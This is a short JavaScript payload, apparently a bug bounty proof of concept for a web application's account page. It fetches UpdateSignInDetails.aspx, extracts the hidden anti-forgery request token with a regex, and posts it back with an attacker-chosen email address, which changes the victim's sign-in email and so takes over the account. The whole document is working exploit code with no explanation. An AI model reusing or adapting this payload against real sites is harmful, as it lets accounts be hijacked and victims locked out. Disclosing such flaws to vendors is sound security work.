async function getText(file) {
    let x = await fetch(file);
    let y = await x.text();
    var t=tok(y);
    send(t);
}
function tok(y){
    const regex = /__RequestVerificationToken" type="hidden" value="(.*?)" /g;
    var token=regex.exec(y)[1];
    console.log(token)
    return token;
}
function send(token){
    fetch("/secure/account/MyAccount/UpdateSignInDetails.aspx",
    {
        headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded'
        },
        method: "POST",
        body: "__RequestVerificationToken="+token+"&EmailAddress=agent-h1%2B21next%40wearehackerone.com&SaveRoute=email&Update=Update",
    })
    .then(function(res){ console.log(res) })
    .catch(function(res){ console.log(res) })
}
getText('/secure/account/MyAccount/UpdateSignInDetails.aspx');
